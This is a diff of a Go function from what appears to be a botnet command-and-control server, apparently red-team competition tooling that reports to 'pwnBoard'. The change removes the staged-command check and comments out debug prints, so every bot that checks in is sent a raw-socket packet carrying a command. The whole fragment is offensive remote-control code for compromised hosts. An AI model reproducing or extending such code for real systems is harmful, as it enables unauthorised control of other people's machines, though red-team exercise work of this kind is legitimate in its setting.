@@ -44,25 +44,25 @@ func sendCommand(iface *net.Interface, myIP net.IP, dstMAC net.HardwareAddr, lis
 		// Block on reading from channel
 		bot := <-listen
 		// Check if there is a command to run
-		if stagedCmd != "" {
-			// Make a socket for sending
-			fd := cattails.NewSocket()
-			// Create packet
-			fmt.Println("SRC MAC:", iface.HardwareAddr)
-			fmt.Println("DST MAC:", dstMAC)
-			fmt.Println("SRC IP:", myIP)
-			fmt.Println("DST IP:", bot.RespIP)
-			packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
-			// YEET
-			cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
+		// if stagedCmd != "" {
+		// Make a socket for sending
+		fd := cattails.NewSocket()
+		// Create packet
+		// fmt.Println("SRC MAC:", iface.HardwareAddr)
+		// fmt.Println("DST MAC:", dstMAC)
+		// fmt.Println("SRC IP:", myIP)
+		// fmt.Println("DST IP:", bot.RespIP)
+		packet := cattails.CreatePacket(iface, myIP, bot.RespIP, bot.DstPort, bot.SrcPort, dstMAC, cattails.CreateCommand(stagedCmd))
+		// YEET
+		cattails.SendPacket(fd, iface, cattails.CreateAddrStruct(iface), packet)
 
-			fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
-			// Close the socket
-			unix.Close(fd)
-			go updatepwnBoard(bot)
-		} else {
-			go updatepwnBoard(bot)
-		}
+		fmt.Println("[+] Sent reponse to:", bot.Hostname, "(", bot.IP, ")")
+		// Close the socket
+		unix.Close(fd)
+		go updatepwnBoard(bot)
+		// } else {
+		// 	go updatepwnBoard(bot)
+		// }
 	}
 }
 
